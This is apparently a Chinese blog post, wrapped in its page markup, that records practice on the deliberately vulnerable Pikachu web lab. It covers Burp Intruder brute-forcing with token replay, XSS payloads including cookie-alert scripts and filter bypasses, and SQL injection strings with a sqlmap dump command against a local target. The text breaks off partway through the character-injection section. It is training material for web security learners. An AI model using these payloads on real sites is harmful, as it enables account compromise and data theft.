@@ -1,0 +1,526 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Pikachu练习记录 | Atdunbg</title><meta name="author" content="Atdunbg,979541498@qq.com"><meta name="copyright" content="Atdunbg"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Pikachu练习记录0x01 Pikachu靶场Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。 链接：https:&#x2F;&#x2F;github.com&#x2F;zhuifengshaonianhanlu&#x2F;pikachu 0x02 暴力破解基于表单的暴力破解如题，直接放bur">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu练习记录">
+<meta property="og:url" content="https://atdunbg.xyz/2023/08/10/Pikachu_practice/index.html">
+<meta property="og:site_name" content="Atdunbg">
+<meta property="og:description" content="Pikachu练习记录0x01 Pikachu靶场Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。 链接：https:&#x2F;&#x2F;github.com&#x2F;zhuifengshaonianhanlu&#x2F;pikachu 0x02 暴力破解基于表单的暴力破解如题，直接放bur">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://rz9ih6j96.hn-bkt.clouddn.com/pikachu_practice.jpg">
+<meta property="article:published_time" content="2023-08-10T07:06:10.000Z">
+<meta property="article:modified_time" content="2023-08-12T06:15:44.380Z">
+<meta property="article:author" content="Atdunbg">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://rz9ih6j96.hn-bkt.clouddn.com/pikachu_practice.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://atdunbg.xyz/2023/08/10/Pikachu_practice/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pikachu练习记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-12 14:15:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><span id="fps"></span><style id="themeColor"></style><style id="rightSide"></style><style id="transPercent"></style><style id="blurNum"></style><style id="settingStyle"></style><span id="fps"></span><style id="defineBg"></style><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/custom.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><link rel="stylesheet" href="/css/custom.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avater.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://81.68.242.29:5212/s/2WHL"><span> 小工具盘</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 值得推荐</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于..</span></a></li><li><a class="site-page child" href="/airconditioner/"><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw hide"></i><span> 线路</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://atdunbg.gitee.io/"><span> Gitee</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://atdunbg.github.io/"><span> Github</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.atdunbg.xyz/"><span> Vercel</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://rz9ih6j96.hn-bkt.clouddn.com/pikachu_practice.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Atdunbg"><span class="site-name">Atdunbg</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://81.68.242.29:5212/s/2WHL"><span> 小工具盘</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 值得推荐</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于..</span></a></li><li><a class="site-page child" href="/airconditioner/"><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw hide"></i><span> 线路</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://atdunbg.gitee.io/"><span> Gitee</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://atdunbg.github.io/"><span> Github</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://www.atdunbg.xyz/"><span> Vercel</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pikachu练习记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-10T07:06:10.000Z" title="发表于 2023-08-10 15:06:10">2023-08-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-12T06:15:44.380Z" title="更新于 2023-08-12 14:15:44">2023-08-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Pikachu练习记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><meta name="referrer" content="no-referrer"/>
+
+
+
+
+<h1 id="Pikachu练习记录"><a href="#Pikachu练习记录" class="headerlink" title="Pikachu练习记录"></a>Pikachu练习记录</h1><h2 id="0x01-Pikachu靶场"><a href="#0x01-Pikachu靶场" class="headerlink" title="0x01 Pikachu靶场"></a>0x01 Pikachu靶场</h2><p>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
+<h2 id="0x02-暴力破解"><a href="#0x02-暴力破解" class="headerlink" title="0x02 暴力破解"></a>0x02 暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>如题，直接放burp里暴力破解即可</p>
+<h3 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h3><p>在intruder里同一个验证码可重复使用</p>
+<h3 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h3><p>在intruder里同一个验证码可重复使用，也可以审查元素把相关的验证码代码删掉，不影响</p>
+<h3 id="Token防爆破？"><a href="#Token防爆破？" class="headerlink" title="Token防爆破？"></a>Token防爆破？</h3><p>多次抓包后发现，每次抓取的数据包中都含有下次请求所需要的token</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/93c1e629ff51411a8dd4ea533d963e9c" alt="token防爆破"></p>
+<p>可以用burp里Intruder进行爆破，爆破类型用Pitchfork，爆破变量为password和token</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/6b3b71caf0f2436ebbb3ea5e7a314dec" alt="token防爆破"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/200238fc90554a519f8351a42500e833" alt="token防爆破"></p>
+<p>对于token载荷相关设置，Payload type选择为 Recursive grep（递归搜索）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/9593577156c644adaebdb73e92b11b1c" alt="token防爆破"><br>然后在设置中的Grep - Extract中添加过滤项，找到token的位置，进行添加，同时把token值复制一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/685ec0ee19d54df6ac580fdfd7eb1906" alt="token防爆破"></p>
+<p>最后填写下一个token值开始爆破</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/0b079f2c0fe541438b071614d3b0aa04" alt="token防爆破"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/e1ca103f02c94e70b1ede69fca8a8193" alt="token防爆破"></p>
+<h2 id="0x03-Cross-Site-Scripting"><a href="#0x03-Cross-Site-Scripting" class="headerlink" title="0x03 Cross-Site Scripting"></a>0x03 Cross-Site Scripting</h2><h3 id="反射型xss（get）"><a href="#反射型xss（get）" class="headerlink" title="反射型xss（get）"></a>反射型xss（get）</h3><p>输入框被限制了最大输入长度，但是可以通过审查元素修改maxlength值来解除限制</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/10c035bdcf644ccb94a0a7a37753a2a2" alt="反弹型xss1"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入框直接上脚本</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hello&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="反射型xss（post）"><a href="#反射型xss（post）" class="headerlink" title="反射型xss（post）"></a>反射型xss（post）</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登陆进去后输入框内输入以下内容</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>输入hello正常文本</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/9786a08c2f5c41ceacb971a40c3fe15c" alt="dom型xss1"></p>
+<p>输入下方文本</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=alert(&#x27;hello&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/c833289eb960479085de9bcb64f30698" alt="dom型xss2"></p>
+<h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;hello&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+<p>输入信息同时也会显示在url输入框里。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/3c48c1b0488e43e39851e5b69b5301f9" alt="dom型xss-x1"></p>
+<h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">留言板输入：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/d152522ab50d4633aa4104e1caa5f4fe" alt="xss之盲打1"></p>
+<p>提示/xssblind/admin_login.php，登陆后台发现脚本会立即执行</p>
+<h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><p>大小写绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRipt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScriPt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(1)&#x27;</span><br><span class="line"></span><br><span class="line">&#x27; onclick=&#x27;javascript:alert(document.cookie)&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>js伪协议绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>输入信息通过审查元素可以看到输入内容在js标签内</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/752caaecac864c0b9a9a89f9bae62685" alt="xss之js输出1"></p>
+<p>可以先把前面的\<script\>进行闭合，构造以下payload即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x04-CSRF"><a href="#0x04-CSRF" class="headerlink" title="0x04 CSRF"></a>0x04 CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><h3 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h3><h2 id="0x05-Sql-Inject"><a href="#0x05-Sql-Inject" class="headerlink" title="0x05 Sql Inject"></a>0x05 Sql Inject</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p><strong>1，手动注入</strong></p>
+<p>发现是个选项，无法输入东西 ，直接拦截数据包，在burp里进行修改</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/61878eb5117346278df8e6d21d484797" alt="数字型注入1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">id=1</span><br><span class="line">#正常回显</span><br><span class="line"></span><br><span class="line">id=1&#x27;</span><br><span class="line">#提示报错</span><br><span class="line"></span><br><span class="line">id=1 and 1=1</span><br><span class="line">#正常回显</span><br><span class="line"></span><br><span class="line">id=1 and 1=2</span><br><span class="line">#报错，基本判断为mysql数据库的数字型注入点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id=1 or 1=1</span><br><span class="line">#直接爆破出全部数据</span><br></pre></td></tr></table></figure>
+<p><strong>2，无脑sqlmap</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/vul/sqli/sqli_id.php --data &quot;id=1&quot; --batch -D pikachu -T member --dump</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/7a4fcbf829824989ab92496fc3c086ca" alt="数字型注入2"></p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span 